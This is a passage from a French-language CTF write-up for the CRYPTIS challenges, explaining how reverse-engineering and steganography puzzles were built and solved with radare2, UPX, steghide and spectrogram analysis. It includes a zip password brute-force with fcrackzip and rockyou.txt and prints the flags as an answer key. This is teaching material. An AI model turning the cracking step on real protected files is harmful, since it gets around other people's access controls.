Nous allons maintenant nous déplacer sur le `main()`du binaire, pour cela nous utilisons la commande `s main`

```bash
# on saute sur le main
[0x000006a0]> s main
```

Il faut maintenant afficher le contenu du `main()`avec `pdf`.

```bash
# on affiche le main
[0x000006a0]> pdf
...
0x000007e1      c68560ffffff.  mov byte [local_a0h], 0x43  ; 'C'
0x000007e8      c68561ffffff.  mov byte [local_9fh], 0x52  ; 'R'
0x000007ef      c68562ffffff.  mov byte [local_9eh], 0x59  ; 'Y'
0x000007f6      c68563ffffff.  mov byte [local_9dh], 0x50  ; 'P'
0x000007fd      c68564ffffff.  mov byte [local_9ch], 0x54  ; 'T'
0x00000804      c68565ffffff.  mov byte [local_9bh], 0x49  ; 'I'
0x0000080b      c68566ffffff.  mov byte [local_9ah], 0x53  ; 'S'
0x00000812      c68567ffffff.  mov byte [local_99h], 0x7b  ; '{'
0x00000819      c68568ffffff.  mov byte [local_98h], 0x61  ; 'a'
0x00000820      c68569ffffff.  mov byte [local_97h], 0x73  ; 's'
0x00000827      c6856affffff.  mov byte [local_96h], 0x63  ; 'c'
0x0000082e      c6856bffffff.  mov byte [local_95h], 0x69  ; 'i'
0x00000835      c6856cffffff.  mov byte [local_94h], 0x69  ; 'i'
0x0000083c      c6856dffffff.  mov byte [local_93h], 0x5f  ; '_'
0x00000843      c6856effffff.  mov byte [local_92h], 0x65  ; 'e'
0x0000084a      c6856fffffff.  mov byte [local_91h], 0x76  ; 'v'
0x00000851      c68570ffffff.  mov byte [local_90h], 0x65  ; 'e'
0x00000858      c68571ffffff.  mov byte [local_8fh], 0x72  ; 'r'
0x0000085f      c68572ffffff.  mov byte [local_8eh], 0x79  ; 'y'
0x00000866      c68573ffffff.  mov byte [local_8dh], 0x77  ; 'w'
0x0000086d      c68574ffffff.  mov byte [local_8ch], 0x68  ; 'h'
0x00000874      c68575ffffff.  mov byte [local_8bh], 0x65  ; 'e'
0x0000087b      c68576ffffff.  mov byte [local_8ah], 0x72  ; 'r'
0x00000882      c68577ffffff.  mov byte [local_89h], 0x65  ; 'e'
0x00000889      c68578ffffff.  mov byte [local_88h], 0x7d  ; '}'
...

# on quitte
[0x000007aa]> q
```

On peut voir que dans le contenu du `main` (sortie de `pdf`) que des données sont stockées avec leur valeur en hexadécimal. La structure de données utilisée est sûrement un tableau. On peut remarquer que les 3 premières valeurs sont `0x43`, `0x52` et `0x59`. En codage ASCII, ces 3 valeurs correspondent aux lettres `C`, `R`, `Y`. Ce sont donc les premières lettres du flag que l'on cherche, car ces dernières respectent le format`CRYPTIS{...}`. On peut voir que `radare2` nous aide beaucoup dans cette situation, en effet ce dernier nous affiche directement les caractères ASCII correspondants aux valeurs hexadécimales.

Pour terminer nous pouvons récupérer chaque valeur hexadécimale, et afficher le caractère ASCII associé avec un programme python.

```bash
$ python3
>>> flag = [0x43, 0x52, 0x59, 0x50, 0x54, 0x49, 0x53, 0x7b, 0x61, 0x73, 0x63, 0x69, 0x69, 0x5f, 0x65, 0x76, 0x65, 0x72, 0x79, 0x77, 0x68, 0x65, 0x72, 0x65, 0x7d]
>>> for c in flag:
...     print(chr(c), end='')
... 
CRYPTIS{ascii_everywhere}
```

`CRYPTIS{ascii_everywhere}`

# reverse_0600_reverse_3

---

### Titre : Reverse 3

### Points : 600

---

### Description

---

Reverse me if you can :)

---

### Réalisation

---

Ce troisième challenge est une suite au `reverse_0400_reverse_2`. La flag `CRYPTIS{ascii_with_shift_encryption}` est encore écrit dans le code, mais cette fois, on a appliqué un chiffrement par décalage de `-21` sur les valeurs ASCII d'origines.

Voici le script pour réaliser le décalage de `-21`en utilisant python.

```bash
$ python3
>>> flag = 'CRYPTIS{ascii_with_shift_encryption}'
>>> for c in flag:
...     print(ord(c)-21, end=', ')
... 
46, 61, 68, 59, 63, 52, 62, 102, 76, 94, 78, 84, 84, 74, 98, 84, 95, 83, 74, 94, 83, 84, 81, 95, 74, 80, 89, 78, 93, 100, 91, 95, 84, 90, 89, 104
```

Code principal proche des précédents.

```c
#include <stdio.h>
#include <string.h>

int main() {
  
  char input[100];
  char *a = "Re-Bonjour";
  char *b = "Bon, c'est l'heure de réfléchir (un tout petit peu)";
  char flag[] = {46, 61, 68, 59, 63, 52, 62, 102, 76, 94, 78, 84, 84, 74, 98, 84, 95, 83, 74, 94, 83, 84, 81, 95, 74, 80, 89, 78, 93, 100, 91, 95, 84, 90, 89, 104, 0};
  char *c = "APGES TEAM";
  char *d = "Good luck";
  char *e = "<3";
  
  printf("Give me the flag: ");
  scanf("%s", input);

  int i = 0;
  while (input[i] != '\0' && flag[i] != '\0') {
    if ((int)input[i] != (int)flag[i]+21) {
      break;
    }
    i++;
  }
  if (i == strlen(input) && i == 36) {
    printf("Congratulation, you can submit this flag :)\n");
  } else {
    printf("Bad flag, try again :(\n");
  }
  
  return 0;
}
```

Pour rendre le challenge un peu plus complexe, on va packer notre binaire avec UPX.

> UPX is a portable, extendable, high-performance executable packer for several different executable formats.

```bash
# compilation
$ gcc -static main.c -o reverse_me_3
$ upx reverse_me_3 
             Ultimate Packer for eXecutables
                Copyright (C) 1996 - 2017
UPX 3.94 Markus Oberhumer, Laszlo Molnar & John Reiser

      File size         Ratio      Format      Name
  --------------------   ------   -----------   -----------
    958320 ->    368116   38.41%   linux/amd64   reverse_me_3                  

Packed 1 file.

# exécution
$ ./reverse_me_3
Give me the flag: GneuGneuGneu
Bad flag, try again :(
```

---

### Résolution

---

On commence comme pour le `reverse_0200_reverse_1`. On commence par la commande `file` pour connaître le type de fichier.

```bash
# type de fichier
$ file ./reverse_me_3
reverse_me_1: ELF 64-bit LSB shared object, x86-64,...
```

On a donc encore un exécutable pour linux. Maintenant, utilisons la commande `strings`.

```bash
$ strings ./reverse_me_3 | grep "CRYPTIS"
```

C'est encore triste, il n'y a aucun résultat. Nous allons donc maintenant utiliser un programme afin d'explorer notre `reverse_me_3`. Nous utilisons `radare2`. Il faut donc le lancer en lui passant notre `reverse_me_3` en paramètre.

```bash
$ r2 ./reverse_me_3
[0x000006a0]>
```

On se retrouve maintenant, dans l'interpréteur de `radare2`.

L'étape suivante est d'analyser `reverse_me_3` avec la commande `aaa` puis d'afficher les fonctions trouvées par `radare2` avec la commande `afl`.

On se rend compte de notre binaire est bien étrange, les instructions ne sont pas très compréhensibles. Peut-être que notre binaire à été packé ?

```bash
$ strings -a reverse_me_3 | grep 'UPX'
-UPX!8
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $
UPX!u
UPX!
UPX!
```

En effet, c'est bien la cas. Pour continuer, nous devons le dépacker !

```bash
$ upx -d reverse_me_3 
     Ultimate Packer for eXecutables
       Copyright (C) 1996 - 2017
UPX 3.94  Markus Oberhumer, Laszlo Molnar & John Reiser

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    958320 <-    368116   38.41%   linux/amd64   reverse_me_3

Unpacked 1 file.
```

Reprenons maintenant avec un binaire propre.

```bash
# on lance une analyse du binaire
[0x000006a0]> aaa

# on affiche les fonctions du binaire
[0x000006a0]> afl
...
0x00400b6d   14 594          main
...
```

Nous allons maintenant nous déplacer sur le `main()`du binaire, pour cela nous utilisons la commande `s main`

```bash
# on saute sur le main
[0x000006a0]> s main
```

Il faut maintenant afficher le contenu du `main()`avec `pdf`.

```assembly
# on affiche le main
[0x000006a0]> pdf
...
0x00400ba4      c68550ffffff.  mov byte [local_b0h], 0x2e  ; '.' ; 46      
0x00400bab      c68551ffffff.  mov byte [local_afh], 0x3d  ; '=' ; 61      
0x00400bb2      c68552ffffff.  mov byte [local_aeh], 0x44  ; 'D' ; rflags  
0x00400bb9      c68553ffffff.  mov byte [local_adh], 0x3b  ; ';' ; 59      
0x00400bc0      c68554ffffff.  mov byte [local_ach], 0x3f  ; '?' ; 63      
0x00400bc7      c68555ffffff.  mov byte [local_abh], 0x34  ; '4' ; 52      
0x00400bce      c68556ffffff.  mov byte [local_aah], 0x3e  ; '>' ; 62      
0x00400bd5      c68557ffffff.  mov byte [local_a9h], 0x66  ; 'f' ; 102     
0x00400bdc      c68558ffffff.  mov byte [local_a8h], 0x4c  ; 'L' ; 76      
0x00400be3      c68559ffffff.  mov byte [local_a7h], 0x5e  ; '^' ; 94      
0x00400bea      c6855affffff.  mov byte [local_a6h], 0x4e  ; 'N' ; 78      
0x00400bf1      c6855bffffff.  mov byte [local_a5h], 0x54  ; 'T' ; 84      
0x00400bf8      c6855cffffff.  mov byte [local_a4h], 0x54  ; 'T' ; 84      
0x00400bff      c6855dffffff.  mov byte [local_a3h], 0x4a  ; 'J' ; 74      
0x00400c06      c6855effffff.  mov byte [local_a2h], 0x62  ; 'b' ; 98      
0x00400c0d      c6855fffffff.  mov byte [local_a1h], 0x54  ; 'T' ; 84      
0x00400c14      c68560ffffff.  mov byte [local_a0h], 0x5f  ; '_' ; 95      
0x00400c1b      c68561ffffff.  mov byte [local_9fh], 0x53  ; 'S' ; 83      
0x00400c22      c68562ffffff.  mov byte [local_9eh], 0x4a  ; 'J' ; 74      
0x00400c29      c68563ffffff.  mov byte [local_9dh], 0x5e  ; '^' ; 94      
0x00400c30      c68564ffffff.  mov byte [local_9ch], 0x53  ; 'S' ; 83      
0x00400c37      c68565ffffff.  mov byte [local_9bh], 0x54  ; 'T' ; 84      
0x00400c3e      c68566ffffff.  mov byte [local_9ah], 0x51  ; 'Q' ; 81      
0x00400c45      c68567ffffff.  mov byte [local_99h], 0x5f  ; '_' ; 95      
0x00400c4c      c68568ffffff.  mov byte [local_98h], 0x4a  ; 'J' ; 74      
0x00400c53      c68569ffffff.  mov byte [local_97h], 0x50  ; 'P' ; 80      
0x00400c5a      c6856affffff.  mov byte [local_96h], 0x59  ; 'Y' ; 89      
0x00400c61      c6856bffffff.  mov byte [local_95h], 0x4e  ; 'N' ; 78      
0x00400c68      c6856cffffff.  mov byte [local_94h], 0x5d  ; ']' ; 93      
0x00400c6f      c6856dffffff.  mov byte [local_93h], 0x64  ; 'd' ; 100     
0x00400c76      c6856effffff.  mov byte [local_92h], 0x5b  ; '[' ; 91      
0x00400c7d      c6856fffffff.  mov byte [local_91h], 0x5f  ; '_' ; 95      
0x00400c84      c68570ffffff.  mov byte [local_90h], 0x54  ; 'T' ; 84      
0x00400c8b      c68571ffffff.  mov byte [local_8fh], 0x5a  ; 'Z' ; 90      
0x00400c92      c68572ffffff.  mov byte [local_8eh], 0x59  ; 'Y' ; 89      
0x00400c99      c68573ffffff.  mov byte [local_8dh], 0x68  ; 'h' ; 104     
0x00400ca0      c68574ffffff.  mov byte [local_8ch], 0
...
# on quitte
[0x000007aa]> q
```

On peut voir que dans le contenu du `main()` (sortie de `pdf`) que des données sont stockées, avec leur valeur en hexadécimal. C'est probablement un tableau qui contient toutes ces valeurs. On peut remarquer que les 3 premières valeurs sont `0x2e`, `0x3d` et `0x44`. Ces valeurs sont plutôt étranges, cependant, on remarque que `|0x2e - 0x3d|` (la différence) est égale à 15, qui correspond à la distance entre les lettres `C` et `R`  . Également, `|0x3d - 0x44|` vaut 7, c'est-à-dire à la distance entre les lettres `R` et `Y`. On comprend rapidement que l'on a appliqué un chiffrement par décalage sur le flag. Le décalage est la différence entre la lettre voulue, par exemple `C` (c'est-à-dire `0x43`) et la lettre donnée, dans notre cas, c'est `0x2e`.

```bash
# calcul du décalage
$ python3 -c "print(abs(0x43-0x2e))" # on veut la valeur absolue avec abs()
21
```

Un décalage de `-21` a donc été appliqué à notre flag, pour trouver ce dernier, il faudra simplement, réaliser un décalage inverse de `+21`. Voici le script qui permet de réaliser le décalage inverse sur les valeurs hexadécimales.

```bash
$ python3
>>> flag = [0x2e, 0x3d, 0x44, 0x3b, 0x3f, 0x34, 0x3e, 0x66, 0x4c, 0x5e, 0x4e, 0x54, 0x54, 0x4a, 0x62, 0x54, 0x5f, 0x53, 0x4a, 0x5e, 0x53, 0x54, 0x51, 0x5f, 0x4a, 0x50, 0x59, 0x4e, 0x5d, 0x64, 0x5b, 0x5f, 0x54, 0x5a, 0x59, 0x68]
>>> for c in flag:
...     print(chr(c+21), end='')
... 
CRYPTIS{ascii_with_shift_encryption}
```

Un autre moyen de remarquer la présence d'un décalage de `-21` est de regarder dans le code assembleur du `main()`.

```assembly
# on affiche le main
[0x000006a0]> pdf
...
0x00400d26      0fbec0         movsx eax, al                               
0x00400d29      83c015         add eax, 0x15                               
0x00400d2c      39c2           cmp edx, eax                                
0x00400d2e      752e           jne 0x400d5e
...
# on quitte
[0x000007aa]> q
```

On peut voir que sur cet extrait d'instructions, un `add eax, 0x15`, l'instruction `add` comme son nom l'indique, permet de réaliser une addition. Dans notre cas, elle ajoute `0x15` à la valeur du registre `eax`. Pour faire simple : `eax = eax + 0x15`. On remarque aussi que `Ox15` vaut 21, car `16 + 5 = 21`. Donc c'est à ce moment qu'on réalise le `+21` dans le code C afin de voir si on a bien les bons caractères. Ensuite, `cmp edx, aex` permet de comparer notre `eax` (char du flag) avec `edx` (char de l'input utilisateur). Et de prendre une décision selon le résultat avec `jne 0x400d5e`. Le `jne` signifie Jump Not Equal, c'est dans le cas ou `edx` et `eax` ne sont pas égaux.

`CRYPTIS{ascii_with_shift_encryption}`

# reverse_0800_reverse_4

---

### Titre : Reverse 4

### Points : 800

---

### Description

---

Reverse me if you can :)

---

### Réalisation

---

Ce quatrième challenge est une suite au `reverse_0600_reverse_3`. La flag `CRYPTIS{ascii_with_xor_encryption}` n'est cette fois, pas écrit dans le code. 

Voici le script pour réaliser le chiffrement XOR en utilisant python.

```bash
$ python3
>>> flag = b'CRYPTIS{ascii_with_xor_encryption}'
>>> for i in range(len(flag)):
...     print(flag[i] ^ 0x77, end=', ')
... 
52, 37, 46, 39, 35, 62, 36, 12, 22, 4, 20, 30, 30, 40, 0, 30, 3, 31, 40, 15, 24, 5, 40, 18, 25, 20, 5, 14, 7, 3, 30, 24, 25, 10
```

Code principal proche des précédents.

```c
#include <stdio.h>
#include <string.h>

int main() {
  
  char input[100];
  char *a = "Re-Re-Bonjour";
  char *b = "Bon, c'est l'heure de réfléchir (un dernier pour la route)";
  char flag[] = {52, 37, 46, 39, 35, 62, 36, 12, 22, 4, 20, 30, 30, 40, 0, 30, 3, 31, 40, 15, 24, 5, 40, 18, 25, 20, 5, 14, 7, 3, 30, 24, 25, 10, 0};
  char *c = "APGES TEAM";
  char *d = "Good luck";
  char *e = "<3";
  
  printf("Give me the flag: ");
  scanf("%s", input);

  int i = 0;
  while (input[i] != '\0') {
    if (((int)input[i]^119) != (int)flag[i]) {
      break;
    }
    i++;
  }
  if (i == strlen(input) && i == 34) {
    printf("Congratulation, you can submit this flag :)\n");
  } else {
    printf("Bad flag, try again :(\n");
  }
  
  return 0;
}
```

Comme pour `reverse_0600_reverse_3`, nous allons aussi packer le binaire avec UPX.

```bash
# compilation
$ gcc -static main.c -o reverse_me_4
$ upx reverse_me_4 
       Ultimate Packer for eXecutables
         Copyright (C) 1996 - 2017
UPX 3.94 Markus Oberhumer, Laszlo Molnar & John Reiser

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    958320 ->    368072   38.41%   linux/amd64   reverse_me_4                  

Packed 1 file.

# exécution
$ ./reverse_me_4
Give me the flag: GneuGneuGneu
Bad flag, try again :(
```

---

### Résolution

---

On commence comme pour le `reverse_0200_reverse_1`. On commence par la commande `file` pour connaître le type de fichier.

```bash
# type de fichier
$ file ./reverse_me_3
reverse_me_1: ELF 64-bit LSB shared object, x86-64,...
```

On a donc encore un exécutable pour linux. Maintenant, utilisons la commande `strings`.

```bash
$ strings ./reverse_me_4 | grep "CRYPTIS"
```

C'est encore triste, il n'y a aucun résultat. Nous allons donc maintenant utiliser un programme afin d'explorer notre `reverse_me_3`. Nous utilisons `radare2`. Il faut donc le lancer en lui passant notre `reverse_me_3` en paramètre.

```bash
$ r2 ./reverse_me_4
[0x000006a0]>
```

On se retrouve maintenant, dans l'interpréteur de `radare2`.

Comme `reverse_0600_reverse_3`, il faut unpacker le binaire...

```bash
$ strings -a reverse_me_4 | grep 'UPX'
-UPX!8
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $
UPX!u
UPX!
UPX!
$ upx -d reverse_me_4 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94 Markus Oberhumer, Laszlo Molnar & John Reiser

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    958320 <-    368072   38.41%   linux/amd64   reverse_me_4

Unpacked 1 file.
```

L'étape suivante est d'analyser `reverse_me_4` avec la commande `aaa` puis d'afficher les fonctions trouvées par `radare2` avec la commande `afl`.

```bash
# on lance une analyse du binaire
[0x000006a0]> aaa

# on affiche les fonctions du binaire
[0x000006a0]> afl
...
0x00400b6d   13 556          main
...
```

Nous allons maintenant nous déplacer sur le `main()`du bianire, pour cela nous utilisons la commande `s main`

```bash
# on saute sur le main
[0x000006a0]> s main
```

Il faut maintenant afficher le contenu du `main()`avec `pdf`.

```assembly
# on affiche le main
[0x000006a0]> pdf
...
0x00400ba4      c68550ffffff.  mov byte [local_b0h], 0x34  ; '4' ; 52
0x00400bab      c68551ffffff.  mov byte [local_afh], 0x25  ; '%' ; 37
0x00400bb2      c68552ffffff.  mov byte [local_aeh], 0x2e  ; '.' ; 46
0x00400bb9      c68553ffffff.  mov byte [local_adh], 0x27  ; ''' ; 39
0x00400bc0      c68554ffffff.  mov byte [local_ach], 0x23  ; '#' ; 35
0x00400bc7      c68555ffffff.  mov byte [local_abh], 0x3e  ; '>' ; 62
0x00400bce      c68556ffffff.  mov byte [local_aah], 0x24  ; '$' ; 36
0x00400bd5      c68557ffffff.  mov byte [local_a9h], 0xc   ; 12
0x00400bdc      c68558ffffff.  mov byte [local_a8h], 0x16  ; 22
0x00400be3      c68559ffffff.  mov byte [local_a7h], 4
0x00400bea      c6855affffff.  mov byte [local_a6h], 0x14  ; 20
0x00400bf1      c6855bffffff.  mov byte [local_a5h], 0x1e  ; 30
0x00400bf8      c6855cffffff.  mov byte [local_a4h], 0x1e  ; 30
0x00400bff      c6855dffffff.  mov byte [local_a3h], 0x28  ; '(' ; 40
0x00400c06      c6855effffff.  mov byte [local_a2h], 0
0x00400c0d      c6855fffffff.  mov byte [local_a1h], 0x1e  ; 30
0x00400c14      c68560ffffff.  mov byte [local_a0h], 3
0x00400c1b      c68561ffffff.  mov byte [local_9fh], 0x1f  ; 31
0x00400c22      c68562ffffff.  mov byte [local_9eh], 0x28  ; '(' ; 40
0x00400c29      c68563ffffff.  mov byte [local_9dh], 0xf   ; 15
0x00400c30      c68564ffffff.  mov byte [local_9ch], 0x18  ; 24
0x00400c37      c68565ffffff.  mov byte [local_9bh], 5
0x00400c3e      c68566ffffff.  mov byte [local_9ah], 0x28  ; '(' ; 40
0x00400c45      c68567ffffff.  mov byte [local_99h], 0x12  ; 18
0x00400c4c      c68568ffffff.  mov byte [local_98h], 0x19  ; 25
0x00400c53      c68569ffffff.  mov byte [local_97h], 0x14  ; 20
0x00400c5a      c6856affffff.  mov byte [local_96h], 5
0x00400c61      c6856bffffff.  mov byte [local_95h], 0xe   ; 14
0x00400c68      c6856cffffff.  mov byte [local_94h], 7
0x00400c6f      c6856dffffff.  mov byte [local_93h], 3
0x00400c76      c6856effffff.  mov byte [local_92h], 0x1e  ; 30
0x00400c7d      c6856fffffff.  mov byte [local_91h], 0x18  ; 24
0x00400c84      c68570ffffff.  mov byte [local_90h], 0x19  ; 25
0x00400c8b      c68571ffffff.  mov byte [local_8fh], 0xa
0x00400c92      c68572ffffff.  mov byte [local_8eh], 0
...
# on quitte
[0x000007aa]> q
```

On peut voir que dans le contenu du `main()` (sortie de `pdf`) que des données sont stockées, avec leur valeur en hexadécimal. C'est probablement un tableau qui contient toutes ces valeurs.

```assembly
...
0x00000935      8b8524ffffff   mov eax, dword [local_dch]
0x0000093b      4898           cdqe
0x0000093d      0fb6440580     movzx eax, byte [rbp + rax - 0x80]
0x00000942      83f077         xor eax, 0x77
0x00000945      89c2           mov edx, eax
0x00000947      8b8524ffffff   mov eax, dword [local_dch]
0x0000094d      4898           cdqe
0x0000094f      0fb6840550ff.  movzx eax, byte [rbp + rax - 0xb0]
0x00000957      38c2           cmp dl, al
0x00000959      751a           jne 0x975
0x0000095b      838524ffffff.  add dword [local_dch], 1
0x00000962      8b8524ffffff   mov eax, dword [local_dch]
0x00000968      4898           cdqe
0x0000096a      0fb6440580     movzx eax, byte [rbp + rax - 0x80]
0x0000096f      84c0           test al, al
0x00000971      75c2           jne 0x935
...
```

Sur ce bloc on peut voir un XOR sur `eax` avec `0x77`, il s'agit peut-être d'un chiffrement avec cette valeur.

```bash
$ python3
>>> flag = [0x34, 0x25, 0x2e, 0x27, 0x23, 0x3e, 0x24, 0xc, 0x16, 0x4, 0x14, 0x1e, 0x1e, 0x28, 0x0, 0x1e, 0x3, 0x1f, 0x28, 0xf, 0x18, 0x5, 0x28, 0x12, 0x19, 0x14, 0x5, 0xe, 0x7, 0x3, 0x1e, 0x18, 0x19, 0xa]
>>> for c in flag:
...     print(chr(c^0x77), end='')
CRYPTIS{ascii_with_xor_encryption}
```

`CRYPTIS{ascii_with_xor_encryption}`

# stega_0100_read_me

------

### Titre : Read me

### Points : 100

------

### Description

------

Are you a 1 or a 0 ?

------

### Réalisation

------

Le but de ce challenge est d'introduire une méthode de stéganographie permettant de cacher des informations dans un document.

Pour réaliser ce challenge, nous avons créé un document PDF avec un texte quelconque puis nous avons ajouté le flag en blanc à la fin du document. Ainsi lorsqu'on ouvre le fichier nous ne voyons pas le flag puisqu'il se confond avec la couleur du fond. 

------

### Résolution

------

Pour résoudre ce challenge il suffit simplement de sélectionner tout le document, ainsi on pourra voir que la dernière ligne est également sélectionnée ce qui veut dire qu'elle contient elle aussi du texte.

`CRYPTIS{Mr_r0B0t_1_0R_0}`

# stega_0150_hidden_secret

------

### Titre : Hidden_secret

### Points : 150

------

### Description

------

Mon commentaire t'aidera.

------

### Réalisation

On commence par incorporer un commentaire à l'intérieur de l'image via la commande suivante : 

```bash
$ convert image.jpg -set comment "steghide -> commenthere" image.jpg
```

Puis on crée un mot de passe que l'on stockera dans un fichier texte :

```bash
$ echo "CRYTPIS{W34k_s3cr3t_c0mm3nt}" > secret.txt
```

Et enfin, on cache ce fichier à l'intérieur de l'image grâce à Steghide :

```bash
$ steghide embed -cf image.jpg -ef secret.txt
```

------

### Résolution

------

Pour résoudre ce challenge, on peut utiliser la commande suivante pour voir le contenu de l'image :

```bash
$ identify -verbose image.jpg
```

On remarquera que l'image possède un commentaire. 

```
Comment                         : steghide -> commenthere
```

On peut ensuite utiliser l'outil Steghide dont parle le commentaire avec le mot de passe fourni ainsi :

```bash
$ steghide extract -sf image.jpg
```

On retrouve alors le fichier secret.txt contenant le flag

`CRYPTIS{N0t_s0_qu1ck_r3sp0ns3}`



# stega_0200_do_not_trust_me

------

### Titre : Do not trust me

### Points : 200

------

### Description

------

Le flag se trouve dans ce document. Qu'attends-tu pour valider le challenge ?

------

### Réalisation

------

Le but de ce challenge est de montrer qu'il ne faut pas toujours se fier aux extensions de fichier :wink:

Pour réaliser ce challenge nous avons commencé par créer un fichier `.txt` contenant le flag. Nous avons ensuite déguisé ce fichier `.txt` en fichier `.png`.  Nous avons ajouté ce dernier à une archive que nous avons protégée avec un mot de passe. Pour finir nous avons déguisé l'archive en fichier ` .pdf`.

```bash
$ echo 'CRYPTIS{g00d_j0b}' > flag.txt
$ mv flag.txt flag.png
$ zip --encrypt -P 'mamatoto123' flag.zip flag.png
$ mv flag.zip flag.pdf
```

------

### Résolution

------

Pour ce challenge nous sommes en possession d'un fichier `flag.pdf`, on remarque rapidement qu'il est impossible de l'ouvrir en tant que PDF. Nous allons alors vérifier de quel type de fichier il s'agit à l'aide de la commande `file`:

```bash
$ file flag.pdf 
flag.pdf: Zip archive data, at least v1.0 to extract
```

Le fichier `flag.pdf` est en fait une archive au format ZIP. Il est donc sûrement possible d'extraire son contenu avec la commande `unzip`: 

```bash
$ unzip flag.pdf
Archive:  flag.pdf
[flag.pdf] flag.png password:
```

On remarque rapidement que l'archive est protégée par un mot de passe. Pour brute force le mot de passe d'une archive on peut utiliser la commande `fcrackzip` en lui précisant un dictionnaire de mots de passe dans lequel chercher, le plus utilisé étant `rockyou.txt`:

```bash
$ fcrackzip -vuDp rockyou.txt flag.pdf
found file 'flag.png', (size cp/uc  30/ 18, flags 9, chk 733d)
PASSWORD FOUND!!!!: pw == mamatoto123
```

Maintenant que nous avons le mot de passe qui protège l'archive nous pouvons extraire son contenu (toujours avec la commande `unzip`):

```bash
$ unzip flag.pdf
Archive:  flag.pdf
[flag.pdf] flag.png password: mamatoto123
 extracting: flag.png
```

L'archive contient un fichier `flag.png` qu'il est impossible d'ouvrir en tant qu'image... Je vous laisse deviner la suite ... :wink:

`CRYPTIS{g00d_j0b}`



# sonic_0200_sonic

---

### Titre : Sonic

### Points : 200

---

### Description

---

Find the flag.

---

### Réalisation

---

Le but de ce challenge est de cacher le flag: `CRYPTIS{flag_in_s0unds}` dans un fichier audio. Ce type de challenge est souvent présent dans les CTF. Voici les étapes pour créer un son à partir de l'image d'un flag :

* avoir une image en noir et blanc sur laquelle se trouve un flag
* ouvrir cette image avec __Coagula (Windows)__
* écouter l'audio : `Sound > Render Without Blue`
* enregistrer l'audio : `File > Save Sound As ...`

On se retrouve maintenant avec un fichier audio, on peut vérifier ça avec la commande `file` qui permet de connaître le type d'un fichier.

```bash
$ file flag.jpg 
flag.jpg: JPEG image data, JFIF standard 1.01,...
$ file flag.wav
sonic.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz
```

---

### Résolution

---

L'écoute du fichier n'apporte pas grand chose sur la manière de trouver le flag. Utilisons le commande `file` pour s'assurer que nous avons bien un fichier audio `wav`.

```bash
$ file sonic.wav
sonic.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz
```

C'est donc bien le cas. Utilisons maintenant `Sonic Visualiser` afin d'analyser le spectrogramme de l'audio.

* ouvrir le fichier `flag.wav`  avec le logiciel d'analyse de fichiers audio `Sonic Visualiser`
* inspecter le spectrogramme : `Layer > Add Spectrogram > All Channels Mixed`
* Paramètres :
  * Color : Black on White
  * Scale : dBV | None
  * Window : 512 | 93.75 % | 4x
  * Bins : All Bins | Linear

Avec ces bons paramètres, on peut facilement lire les lettres de flag.

`CRYPTIS{flag_in_s0unds}`

# stega_0300_anti_sonic

---

### Titre : Anti Sonic

### Points : 300

---

### Description

---

`https://www.youtube.com/watch?v=2bjk26RwjyU`

---

### Réalisation

---

Le but de ce challenge est de brouiller les pistes en faisant croire que nous cachions un flag dans un fichier audio. un message est bien caché dans le spectrogramme mais celui-ci ne correspond pas au flag.

On se retrouve avec un fichier audio, on peut vérifier ça avec la commande `file` qui permet de connaître le type d'un fichier.

```bash
$ file anti_sonic.wav
sonic.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz
```

```bash
$ echo "CRYPTIS{good_job<3}" >> anti_sonic.wav
```

Nous ajoutons le flag à l'aide de la commande `echo` à la fin de notre fichier `.wav`.

```bash
$ file anti_sonic.wav 
anti_sonic.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz
```

Comme nous pouvons le voir, notre type de fichier n'a pas changé.

---

### Résolution

---

L'écoute du fichier n'apporte pas grand chose sur la manière de trouver le flag. Utilisons le commande `file` pour s'assurer que nous avons bien un fichier audio `wav`.

```bash
$ file anti_sonic.wav
anti_sonic.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 22050 Hz
```

C'est donc bien le cas. Utilisons maintenant `Sonic Visualiser` afin d'analyser le spectrogramme de l'audio.

* ouvrir le fichier `sonic.wav`  avec le logiciel d'analyse de fichiers audio `Sonic Visualiser`
* inspecter le spectrogramme : `Layer > Add Spectrogram > All Channels Mixed`

On se rend compte rapidement qu'un message est bien present dans le spectrogramme, mais ce dernier ne correspond pas au flag.

Néanmoins, il existe quelques règles de bonne pratique lorsqu'on débute un challenge.

Si c'est un fichier, le passer sous les outils `file` et `strings` est un minimum.

`strings`: affiche les chaines de caractères affichables du fichier cible.

`grep`: affiche les lignes contenant la chaîne mis en paramètre du fichier cible.

```bash
$ strings anti_sonic.wav | grep CRYPTIS
CRYPTIS{good_job<3}
```

`CRYPTIS{good_job<3}`




# stega_300_biscuit

---

### Titre : Biscuit

### Points : 300

---

### Description

---

Nous avons intercepté une image.

Veuillez retrouver le message transmis en secret !

---

### Réalisation

---

* Utilisation de l'outil steghide pour cacher de l'information dans l'image, en l'occurence ici, le flag.
  * *L'outil **Steghide** est un programme de stéganographie capable de masquer des données dans divers types de fichiers image et audio. Les fréquences d'échantillonnage respectueuses de la couleur ne sont pas modifiées, ce qui rend l'incorporation résistant aux tests statistiques de premier ordre.*

```bash
# Création du fichier contenant le flag
$ echo "CRYPTIS{cR4çk3r_b15cUi7}" > flag.txt
# Insertion du fichier à l'image avec une protection par mot de passe
$ steghide --embed -ef flag.txt -cf biscuit.jpg -e none -Z
Enter passphrase : John
Re-Enter passphrase : John
camouflage des données de "flag.txt" dans "biscuit.jpg". terminé.
$ rm flag.txt
```

---

### Résolution

---

* On essaie les commandes `file`, `strings` et `exiftool` mais l'on ne trouve rien d'intéressant
* En regardant l'image de biscuit cracker, on peut imaginer à *cracker* le fichier



